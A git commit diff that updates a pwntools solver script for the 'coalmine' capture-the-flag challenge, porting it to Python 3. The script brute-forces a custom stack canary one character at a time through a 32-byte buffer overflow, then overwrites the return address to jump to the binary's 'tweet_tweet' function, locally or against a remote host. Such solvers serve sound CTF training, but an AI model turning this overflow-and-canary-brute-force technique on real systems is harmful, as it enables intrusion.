31f20b0035add6b98336dbd14baece2117fbd6e5
Kaitlyn Wimberley <kdw325@nyu.edu>
2020-09-17 23:53:03 -0400

    Updated coalmine and solver

--- pwn/coalmine/solve.py
+++ pwn/coalmine/solve.py
@@ -1,4 +1,4 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 
 from pwn import *
 import sys
@@ -6,33 +6,32 @@ import string
 import time
 
 context.log_level = 'DEBUG'
-context.terminal = ['/usr/bin/termite', '-e']
+#context.terminal = ['/usr/bin/termite', '-e']
 
 e = ELF('./coalmine')
+
 def getp():
     if len(sys.argv) == 3:
         p = remote(sys.argv[1], int(sys.argv[2]))
     else:
         p = process('./coalmine')
-        gdb.attach(p, 'b *main+72\nc\n')
     return p
 
 birdy = ''
 for k in range(8):
-    for c in string.ascii_letters:
+    for c in string.ascii_uppercase:
         p = getp()
-        p.sendlineafter('>', 'A'*(32+k) + c)
-        if '***' not in p.recvline():
+        p.sendlineafter(('>'), str(33+k))
+        p.sendlineafter('>', 'A'*(32) + birdy + c)
+        if b'***' not in p.recvall():
             p.close()
             birdy += c
             break
         p.close()
 
-        p.interactive()
-        exit(1)
-    else:
-        exit(1)
-
+birdy = int(birdy.encode('utf-8').hex(), 16)
+birdy = birdy.to_bytes(8, byteorder='big')
 p = getp()
-p.sendlineafter('>', 'A'*32 + birdy + p32(e.sym.tweet_tweet)*10)
-p.interactive()
+p.sendlineafter('>', "32")
+#gdb.attach(p, 'b')
+p.sendlineafter('>', b'A'*32 + birdy + p32(e.sym.tweet_tweet)*4)
